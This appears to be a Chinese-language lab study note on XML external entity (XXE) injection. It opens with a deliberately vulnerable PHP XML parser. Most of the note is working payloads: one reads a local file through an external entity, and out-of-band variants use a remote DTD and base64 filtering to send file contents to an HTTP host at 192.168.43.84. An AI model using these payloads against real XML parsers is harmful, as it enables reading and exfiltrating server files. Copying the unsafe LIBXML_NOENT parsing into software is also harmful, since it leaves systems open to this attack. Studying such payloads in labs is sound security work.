




```php=
    $xml =$_POST['xml'];
//    $xml = $test;
    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);
    if($data){
        $html.="<pre>{$data}</pre>";
    }else{
        $html.="<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>";
    }
```


### 普通實體 可以在XML文档的任何地方使用
```c
<?xml version = "1.0"?>
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY content SYSTEM "file:///C:/Users/liar/Desktop/123.txt" >

]>


<foo>&content;</foo>
```



---
### 定義了外部檔案 不過並沒有在xml文檔引用，所以沒有請求

```
<?xml version = "1.0"?>
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY  % content SYSTEM "file:///C:/Users/liar/Desktop/123.txt" >
	%content;

]>


<foo></foo>
```




## 外部實體 兩種寫法:



### 第一種

1.準備一個外部惡意dtd
2.最終在xml裡呼叫

hack.dtd
```
<!ENTITY % all "<!ENTITY  send SYSTEM 'http://192.168.43.84/%file;'>">
```

```
<?xml version = "1.0"?>
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.txt" >

	<!ENTITY % remote SYSTEM "file:///C:/Users/liar/Desktop/hack.dtd" >

	%remote;
	%all;


]>


<foo>&send;</foo>
```



---------------------------------------------------------------------------------------

### 第二種

1.準備一個外部惡意dtd (`需要將 % 轉碼  &#x25;`)
2.只在dtd呼叫

hack.dtd
```
<!ENTITY % all "<!ENTITY  &#x25; send SYSTEM 'http://192.168.43.84/%file;'>">
```


```
<?xml version = "1.0"?>
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.txt" >

	<!ENTITY % remote SYSTEM "file:///C:/Users/liar/Desktop/hack.dtd" >

	%remote;
	%all;
	%send;

]>


<foo></foo>
```



### 至於為啥一定要外部DTD 才能成功我並不是很清楚，以下是去掉外部實體但失敗的例子

```
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.txt" >
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.43.84/%file;'>">
    
    %all;
]>
<foo>&send;</foo>


```



其他利用方式:
https://www.kancloud.cn/noahs/src_hacker/2395024